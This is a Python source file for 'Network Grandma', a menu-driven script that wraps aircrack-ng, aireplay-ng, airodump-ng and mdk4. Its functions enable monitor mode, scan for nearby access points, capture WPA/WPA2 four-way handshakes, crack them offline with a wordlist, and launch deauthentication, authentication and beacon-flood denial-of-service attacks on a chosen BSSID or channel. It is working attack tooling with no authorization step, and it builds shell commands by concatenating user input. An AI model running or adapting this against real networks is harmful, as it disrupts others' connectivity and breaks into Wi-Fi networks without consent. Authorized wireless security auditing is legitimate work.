#--------------------------------------------------------------------------------------------------------------------------------
#   ███    ██ ███████ ████████ ██     ██  ██████  ██████  ██   ██      ██████  ██████   █████  ███    ██ ██████  ███    ███  █████  
#   ████   ██ ██         ██    ██     ██ ██    ██ ██   ██ ██  ██      ██       ██   ██ ██   ██ ████   ██ ██   ██ ████  ████ ██   ██ 
#   ██ ██  ██ █████      ██    ██  █  ██ ██    ██ ██████  █████       ██   ███ ██████  ███████ ██ ██  ██ ██   ██ ██ ████ ██ ███████ 
#   ██  ██ ██ ██         ██    ██ ███ ██ ██    ██ ██   ██ ██  ██      ██    ██ ██   ██ ██   ██ ██  ██ ██ ██   ██ ██  ██  ██ ██   ██ 
#   ██   ████ ███████    ██     ███ ███   ██████  ██   ██ ██   ██      ██████  ██   ██ ██   ██ ██   ████ ██████  ██      ██ ██   ██ 
#--------------------------------------------------------------------------------------------------------------------------------
#                  Network Grandma
#                Written by Tenor-Z
#                  Tyler Bifolchi
#--------------------------------------------------------------------------------------------------------------------------------

                                                                                                                               
from threading import Thread
import time                     #Use this module to give some rest breaks in between some segments
import os
import sys
import random
import os.path
import subprocess
import psutil                       #Mostly used for killing processes
import re                               #Needed for verifying channels and BSSIDs (I did a lot of work on this, god I hate regex)


#---------------------------------------------------
#Here's a collection of color codes used throughout
#the program. Some of them go unused.
#--------------------------------------------------
RED = '\033[31m'
LIGHTGREEN = '\033[92m'
RED = '\033[31m'
LIGHTGRAY = '\033[37m'
DARKGRAY = '\033[90m'
LIGHTRED = '\033[91m'
LIGHTGREEN = '\033[92m'
LIGHTORANGE = '\033[33m'
LIGHTBLUE = '\033[94m' 
LIGHTCYAN = '\033[96m'
LIGHTMAGENTA = '\033[35m'
WHITE = '\033[97m'
GRAY = '\033[30m'


current_pid = os.getpid()                           #Get the process ID of the program
parent = psutil.Process(current_pid)                    #Group it as a parent



splashtext = ['                                 Auditing so easy, your grandmother could do it.', '                               Skiddies grew up listening to us, they still do', '                                             When the music gets too loud...', '                                         If all else fails... brute force!', '                               Forget crossword puzzles, beacon flooding is where its at!', "                                            Don't forget to bring a towel!", '                                          Radio frequency enema number one', '                                    I await for the almighty Professor Preet!', "                                               Don't get your yarn tangled up!", "                                Automation so fresh, you'll forget what's in the oven!", '                                             Look ma, no Airgeddon.', '                                      As if auditing could not get any lazier.', '                                            My only purpose is to serve you.', '                                              Like fresh baked cookies.', '                                      Ogres are like OSI onions; they have layers.', '                                         I have granted kids to WPA WLANs.', '                                         Oh my god! They killed my network! You b*stard!', '                                 Stops ALFA adapters from tripping on their shoelaces.', '                                               Hello to the CSI club.', '                        Shoutouts to Willow, River and Zephyr. Love you guys to the moon and back!']



#---------------------------------------
#This function will scan this program for
#child processes and kill them when this
#function is called
#----------------------------------------

def child_killer():
    subprocess.run(['pkill', 'mdk4'])
    for child in parent.children(recursive=True):  #For each child process in this program
        child.kill()



#------------------------------------------------------
#This function will verify the interface
#provided by the user. This is performed
#by using psutil to verify the interface with the list of
#currently plugged in adapters
#------------------------------------------------------
def verify_interface(interface):
    return interface in psutil.net_if_addrs()       #Get all adapters. If the selected interface is present in this list, return True




#--------------------------------------------------------
#This function will validate the provided BSSID by matching
#it to a customized REGEX string. This ensures that it matches
#the right format.
#--------------------------------------------------------
#This is essentially what I spent the most time on since I suck at Regex
#------------------------------------------------------------------------
def verify_bssid(bssid):
    ssid_pattern = re.compile(r'((([a-zA-z0-9]{2}[-:]){5}([a-zA-z0-9]{2}))|(([a-zA-z0-9]{2}:){5}([a-zA-z0-9]{2})))')        #Any number or character followed by six colons (i.e. 00:11:3f:4g:65:h6)
    return bool(ssid_pattern.match(bssid))      #Return True if it matches this format




#---------------------------------------------------------
#This function validates the provided channel by matching
#it to a limited number regex. If there are obvious incorrections
#this function will return false.
#----------------------------------------------------------
def verify_channel(channel):
    channel_pattern = re.compile(r'^[0-9]*$')           #Any collection of numbers not exceeding 4 digits (for 5 Ghz)
    return bool(channel_pattern.match(channel))             #Return True if the channel matches this regex format correctly




#----------------------------------------
#This function is used to scan if certain
#packages are installed. If they are not
#installed, the program will still continue
#to run, but will be limited in functionality
#-----------------------------------------

def query_package(path):
    if os.path.exists(path):
        print(str(path) + ' is ready to use')
    else:
        print((path), 'is not installed. This application may not run correctly.')



#-------------------------------------------
#monitormode will set the provided interface
#to monitor mode using ifconfig. This only
#works on interfaces that support monitor mode
#i.e, wlan0
#-------------------------------------------

def monitormode():
    try:
        refresh()
        print(f"{RED}===============================================")
        print(f"{WHITE}           Monitor Mode Configuration")
        print(f"{RED}===============================================")
        print(f"{WHITE}NOTE: This only works on interfaces that support")
        print(f"{WHITE}monitor mode and/or packet injection")
        print(f"{RED}===============================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
        print(f"{LIGHTGREEN}return to the menu")
        print(f"{RED}===============================================")
        print()
        interface = input(f"{LIGHTGREEN}Please enter your interface here> ")
        if verify_interface(interface):                                             #Check if the interface currently exists
                os.system("ifconfig " + interface + " down")
                os.system("airmon-ng check kill")
                os.system("iwconfig " + interface + " mode monitor")
                os.system("ifconfig " + interface + " up")
                print()
                print(f"{WHITE}===============================================================")
                print(f"Done!")
                print(f"{LIGHTBLUE}If there are any errors, the wrong interface may have been selected.")
                print(f"{LIGHTBLUE}Always ensure that your interface supports monitor mode.")
                print(f"{WHITE}===============================================================")
                print(f"{LIGHTGREEN}Returning to the menu...")
                time.sleep(5)
                menu()
        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Interface", interface, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            monitormode()

    except KeyboardInterrupt:                   #Just cause people use CTRL+C to exit out of Python programs, why not redirect to the menu
        pass                                            #We don't need to kill child processes since there are no attacks running
        menu()



#-----------------------------------------------------
#lockchannel forces an interface to run on a specific
#channel. This allows for said interface to scan 
#APs and perform attacks under a specific channel.
#-----------------------------------------------------

def lockchannel():
    try:
        refresh()
        print(f"{RED}===============================================")
        print(f"{WHITE}           Monitor Mode Configuration")
        print(f"{RED}===============================================")
        print(f"{WHITE}NOTE: This only works on interfaces that support")
        print(f"{WHITE}monitor mode and/or packet injection")
        print(f"{RED}===============================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
        print(f"{LIGHTGREEN}return to the menu")
        print(f"{RED}===============================================")
        print()
        interface = input(f"{LIGHTGREEN}Please enter your interface here> ")
        channel = input(f"{LIGHTGREEN}Please input your desired channel> ")
        if verify_interface(interface):                                                         #Does this interface exist?
            if verify_channel(channel):                                                             #If so, does the channel exist?
                subprocess.run(["iwconfig", interface, "channel", channel])
                print()
                print(f"{WHITE}===============================================================")
                print(f"Done!")
                print(f"{LIGHTBLUE}If there are any errors, the wrong channel may have been selected.")
                print(f"{LIGHTBLUE}Always ensure that you are on the same channel as your target.")
                print(f"{WHITE}===============================================================")
                print(f"{LIGHTGREEN}Returning to the menu...")
                time.sleep(5)
                menu()
            else:
                print(f"{RED}=======================================")
                print(f"{RED}Error!")
                print(f"{RED}Channel", channel, "does not exist!")
                print(f"{RED}=============================================")
                print(f"{RED}Aborting....")
                print(f"{RED}=============================================")
                time.sleep(2)
                lockchannel()
        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Interface", interface, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            lockchannel()

    except KeyboardInterrupt:
        pass
        menu()




#----------------------------------------------------------------------
#This is the menu for selecting layer 1 dos attacks.
#------------------------------------------------------------------------

def layer1menu():
    try:
        refresh()
        print(f"{WHITE}====================================================")
        print(f"{WHITE}Please select the type of Layer 1 DoS attack to use")
        print(f"{WHITE}====================================================")
        print(f"{WHITE}Press CTRL+C to return to the menu")
        print()
        selected = input(f"""{LIGHTGREEN}                 
        1. Layer 1 Frequency Band DoS
        2. Layer 1 Channel DoS
    
        Make your selection now:  """)
    
        if selected == "1":
            layer1frequency()
        elif selected == "2":
            layer1channel()
        
        else:
            print("Invalid input")
            layer1menu()

    except KeyboardInterrupt:
        pass
        menu()




#-----------------------------------------------------
#This is the function that performs layer 1 frequency
#DoS attacks.
#----------------------------------------------------
def layer1frequency():
    try:
        refresh()
        print(f"{RED}===============================================")
        print(f"{WHITE}    Layer 1 Frequency Denial of Service")
        print(f"{RED}===============================================")
        print(f"{WHITE}NOTE: This only works on interfaces that support")
        print(f"{WHITE}monitor mode and/or packet injection")
        print(f"{RED}===============================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
        print(f"{LIGHTGREEN}return to the menu")
        print(f"{RED}===============================================")
        print()
        interface = input(f"{LIGHTGREEN}Please enter your monitor mode interface here> ")
        essid = input(f"{LIGHTGREEN}Please enter the ESSID (target frequency band)> ")
        if verify_interface(interface):
            layer1 = subprocess.run(["mdk4", interface, "b", "-n", essid])
        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Interface", interface, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            layer1frequency()
    
    except KeyboardInterrupt:
        pass
        child_killer()          #Kill all processes to ensure that the attack properly ceases
        menu()




#-----------------------------------------------------------------
#This function is what performs the layer 1 channel DoS attacks
#-----------------------------------------------------------------
def layer1channel():
    try:
        refresh()
        print(f"{RED}===============================================")
        print(f"          Layer 1 Channel Denial of Service")
        print(f"===============================================")
        print(f"NOTE: This only works on interfaces that support")
        print(f"monitor mode and/or packet injection")
        print(f"===============================================")
        print(f"Press CTRL+C at any time to stop the process and")
        print(f"return to the menu")
        print(f"===============================================")
        print()
        channel = input(f"Enter the channel number to attack: ")
        if verify_channel(channel):
            interface = input(f"Please enter your interface here> ")
            if verify_interface(interface):
                subprocess.run(['mdk4',interface,'b','-c',channel])
            else:
                print(f"{RED}=======================================")
                print(f"{RED}Error!")
                print(f"{RED}Interface", interface, "does not exist!")
                print(f"{RED}=============================================")
                print(f"{RED}Aborting....")
                print(f"{RED}=============================================")
                time.sleep(2)
                layer1channel()
        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Channel", channel, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            layer1channel()

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()



#-----------------------------------------------------
#deauthdos will perform a deauthentication Denial of
#Service on the selected AP. The user can specify how
#many packets they wish to send.
#-----------------------------------------------------

def deauthdos():
    try:
        refresh()
        print(f"{RED}================================================")
        print(f"{WHITE}       Deauthentication Denial of Service")
        print(f"{RED}================================================")
        print(f"{WHITE}NOTE: This only works on interfaces that support")
        print(f"{WHITE}monitor mode and/or packet injection")
        print(f"{RED}================================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the attack and") 
        print(f"{LIGHTGREEN}return to the menu.")
        print()
        interface = input(f"{LIGHTGREEN}Please enter your monitor mode interface here> ")
        deauthpacket = input(f"{LIGHTGREEN}Please enter the number of deauthentication packets you wish to send (Type 0 for a continuous attack)> ") #we don't need to verify the amount of deauth packets since it can easily be customized
        bssid = input(f"{LIGHTGREEN}Please specify your target BSSID> ")
        if verify_bssid(bssid):
            if verify_interface(interface):
                deauth = subprocess.run(["aireplay-ng", "--deauth", deauthpacket, "-a", bssid, interface])
            else:
                print(f"{RED}=======================================")
                print(f"{RED}Error!")
                print(f"{RED}Interface", interface, "does not exist!")
                print(f"{RED}=============================================")
                print(f"{RED}Aborting....")
                print(f"{RED}=============================================")
                time.sleep(2)
                deauthdos()
        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}BSSID", bssid, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            deauthdos()

    except KeyboardInterrupt:
        pass
        child_killer()          #Stop the attack for good
        menu()



#----------------------------------------------------
#networkscan tells airodump-ng to scan for the nearby
#access points. Very straightforward.
#----------------------------------------------------

def networkscan():
    try:
        refresh()
        print(f"{RED}================================================")
        print(f"{WHITE}            Nearby Network Scan                ")
        print(f"{RED}================================================")
        print(f"{WHITE}NOTE: This only works on interfaces that support")
        print(f"{WHITE}monitor mode and/or packet injection")
        print(f"{RED}================================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
        print(f"{LIGHTGREEN}return to the menu")
        print()
        interface = input(f"{LIGHTGREEN}Please enter your monitor mode interface here> ")
        print(f"{WHITE}Loading up Airodump-ng....")
        print(f"{WHITE}Please stand by...")
        if verify_interface(interface):
            scan = subprocess.run(['airodump-ng', interface])
        else:
            print()
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Interface", interface, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            networkscan()

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()




#--------------------------------------------------------------
#handshake performs a four way handshake capture by recording
#network traffic via aircrack and sending deauthentication
#packets to speed up the process. The user can connect a client
#to the AP or deauthenticate a connected client to speed up the
#process and capture the handshake
#--------------------------------------------------------------

def handshake():
   try:
    refresh()
    print(f"{RED}================================================")
    print(f"{WHITE}       Capturing WPA/WPA2 Four-Way Handshake    ")
    print(f"{RED}================================================")
    print(f"{WHITE}NOTE: This only works on interfaces that support")
    print(f"{WHITE}monitor mode and/or packet injection")
    print(f"{RED}================================================")
    print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
    print(f"{LIGHTGREEN}return to the menu")
    print()
    interface = input(f"{LIGHTGREEN}Please enter your monitor mode interface here> ")
    bssid = input(f"{LIGHTGREEN}Please enter the BSSID of your target> ")
    channel = input(f"{LIGHTGREEN}Please enter the channel number of your target> ")
    filewrite = input(f"{LIGHTGREEN}Please enter the name of the capture file you want to save to> ")
    refresh()
    print(f"{WHITE}Starting the attempt....")
    print(f"{WHITE}Please stand by...")
    print(f"{WHITE}TIP: To speed up the handshake process, either connect a client to the AP or deauthenticate it.")
    time.sleep(3)
    if verify_interface(interface):
        if verify_bssid(bssid):
            if verify_channel(channel):
                scan = subprocess.run(['airodump-ng', '--bssid', bssid, '--channel', channel, '--write', filewrite, interface])
                deauth = subprocess.run(["aireplay-ng", "--deauth", 7, "-a", bssid, interface]) #Time to speed up!
            else:
                print(f"{RED}=======================================")
                print(f"{RED}Error!")
                print(f"{RED}Channel", channel, "does not exist!")
                print(f"{RED}=============================================")
                print(f"{RED}Aborting....")
                print(f"{RED}=============================================")
                time.sleep(2)
                handshake()
        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}BSSID", bssid, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            handshake()
    else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Interface", interface, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            handshake()

   except KeyboardInterrupt:
       pass
       child_killer()
       menu()



#----------------------------------------------------------------
#beaconflood performs a beacon flood attack where we flood the 
#nearby area with beacon advertisements to arbitrary networks.
#The user can run this on a specific channel to ensure population
#-----------------------------------------------------------------

def beaconflood():
    try:
        refresh()
        print(f"{RED}===========================================")
        print(f"{WHITE}           Beacon Flood Attack")
        print(f"{RED}===========================================")
        print(f"{WHITE}NOTE: This only works on interfaces that support")
        print(f"{WHITE}monitor mode and/or packet injection")
        print(f"{RED}================================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
        print(f"{LIGHTGREEN}return to the menu")
        print(f"{RED}============================================")
        print()
        interface = input(f"{LIGHTGREEN}Please enter your monsitor mode interface here> ")
        channel = input(f"{LIGHTGREEN}Please enter the channel to beacon flood> ")
        if verify_interface(interface):
            if verify_channel(channel):
                flood = subprocess.run(['mdk4', interface, 'b', '-c', channel])
            else:
                print(f"{RED}=======================================")
                print(f"{RED}Error!")
                print(f"{RED}Channel", channel, "does not exist!")
                print(f"{RED}=============================================")
                print(f"{RED}Aborting....")
                print(f"{RED}=============================================")
                time.sleep(2)
                beaconflood()
                
        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Interface", interface, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            beaconflood()

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()


#----------------------------------------------------------
#cracking performs an offline handshake cracking with a cracked
#file and a wordlist. The speed of capture relies on the device's
#processor
#-------------------------------------------------------------

def cracking():
    try:
        refresh()
        print(f"{RED}================================================")
        print(f"{WHITE}       Cracking WPA/WPA2 capture file           ")
        print(f"{RED}================================================")
        print(f"{WHITE}NOTE: This can only be performed once the WPA/WPA2")
        print(f"{WHITE}handshake has been captured.")
        print(f"{RED}================================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
        print(f"{LIGHTGREEN}return to the menu")
        print(f"{RED}===============================================")
        print()
        wordlist = input(f"{LIGHTGREEN}Please enter the full path to your wordlist here> ")
        cap_file = input(f"{LIGHTGREEN}Please enter the full path of the capture (.cap) file> ")
        if not os.path.exists(wordlist):
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Wordlist file", wordlist, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            cracking()
        if not os.path.exists(cap_file):
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Capture File", cap_file, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            cracking()
        else:
            crackin = subprocess.run(['aircrack-ng', cap_file, '-w', wordlist])
            input("Press any key to return to the menu...")

            

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()

#---------------------------------------------------------------
#authdos will perform an Authentication DoS attack by sending
#auth packets instead of deauth
#----------------------------------------------------------------

def authdos():
    try:
        refresh()
        print(f"{RED}================================================")
        print(f"{WHITE}       Authentication Denial of Service         ")
        print(f"{RED}================================================")
        print(f"{WHITE}NOTE: This only works on interfaces that support")
        print(f"{WHITE}monitor mode and/or packet injection")
        print(f"{RED}================================================")
        print(f"{LIGHTGREEN}Press CTRL+C at any time to stop the process and")
        print(f"{LIGHTGREEN}return to the menu")
        print(f"{RED}================================================")
        print()
        interface = input(f"{LIGHTGREEN}Please enter your monitor mode interface here> ")
        bssid = input(f"{LIGHTGREEN}Please enter the BSSID of your target> ")
        if verify_interface(interface):
            if verify_bssid(bssid):
                authflood = subprocess.run(['mdk4', interface, 'a', '-a', bssid])
            else:
                print(f"{RED}=======================================")
                print(f"{RED}Error!")
                print(f"{RED}BSSID", bssid, "does not exist!")
                print(f"{RED}=============================================")
                print(f"{RED}Aborting....")
                print(f"{RED}=============================================")
                time.sleep(2)
                authdos()

        else:
            print(f"{RED}=======================================")
            print(f"{RED}Error!")
            print(f"{RED}Interface", interface, "does not exist!")
            print(f"{RED}=============================================")
            print(f"{RED}Aborting....")
            print(f"{RED}=============================================")
            time.sleep(2)
            authdos()

    except KeyboardInterrupt:
        pass
        child_killer()
        menu()



def main():
    refresh()
    if os.name == "nt":
        print("This program should be run on Linux")
        print("Aborting!")
        print()
        exit()
    else:
        print(f"{LIGHTBLUE}Please wait... Confirming if necessary tools are installed...")  #This code will appear unreachable on Windows but does work on Linux
        print()
        time.sleep(3)
        query_package("/usr/bin/aircrack-ng")           #These tools are essential
        query_package("/usr/sbin/mdk4")
        time.sleep(5)
        menu()



def menu():
    try:
        refresh()
        #print(ifaces)              #debugging stuff

        banner = (f"""{WHITE}

        
        ██████████████████████████████████████████████████████▀█████████████████████████████████████████
        █▄─▀█▄─▄█▄─▄▄─█─▄─▄─█▄─█▀▀▀█─▄█─▄▄─█▄─▄▄▀█▄─█─▄███─▄▄▄▄█▄─▄▄▀██▀▄─██▄─▀█▄─▄█▄─▄▄▀█▄─▀█▀─▄██▀▄─██
        ██─█▄▀─███─▄█▀███─████─█─█─█─██─██─██─▄─▄██─▄▀████─██▄─██─▄─▄██─▀─███─█▄▀─███─██─██─█▄█─███─▀─██
        ▀▄▄▄▀▀▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▀▄▄▄▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▄▀▄▄▄▀▄▄▀▄▄▀
        -----------------------------------------------------------------------------------------------
                                          Written by Tyler Bifolchi (Tenor-Z)
                                                December 6, 2023
        -----------------------------------------------------------------------------------------------
        """)
        print(banner)
        quote = random.choice(splashtext)
        splashin = str(quote.center(20,">"))
        print (splashin)
        print(f"""{WHITE}
        ----------------------------------------------------------------------------------------------""")          
        selected = input(f""" {LIGHTGREEN}               
        1. Turn on Monitor Mode
        2. Scan for Nearby Networks
        3. Get WPA/WPA2 handshake
        4. Crack WPA/WPA2 passkey
        5. Layer 2 Authentication DoS
        6. Layer 2 Deauthentication DoS
        7. Layer 2 Beacon flood
        8. Custom Layer 1 DoS
        9. Lock Interface to Specific Channel
        0. Exit NetworkGrandma
                     
        Make your selection now:  """)
    
        if selected == "1":
            monitormode()
        elif selected == "2":
            networkscan()
        elif selected == "3":
            handshake()
        elif selected == "4":
            cracking()
        elif selected == "5":
            authdos()
        elif selected == "6":
            deauthdos()
        elif selected == "7":
            beaconflood()
        elif selected == "8":
            layer1menu()
        elif selected == "9":
            lockchannel()
        elif selected == "0":
            print()
            print()
            print(f"{LIGHTBLUE}Affirmative!")
            print("See you soon, granny!")
            print("Killing child processes....")
            child_killer()
            time.sleep(2)
            refresh()
            exit()
        else:
            print("Incorrect input!")
            menu()

    except KeyboardInterrupt:
        menu()


#---------------------------------------
#Simple screen refresh function to keep
#things tidy
#---------------------------------------

def refresh():
    platforms = {
        'linux1' : 'Linux',             #Most of these are OS-exclusive commands
        'linux2' : 'Linux',
        'kali' : 'Linux',
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }                                 
 
    if sys.platform == "linux1" or sys.platform == "linux2":
        os.system("clear")
    elif sys.platform == "win32":
        os.system("cls")
    else:
        os.system("clear")

main()
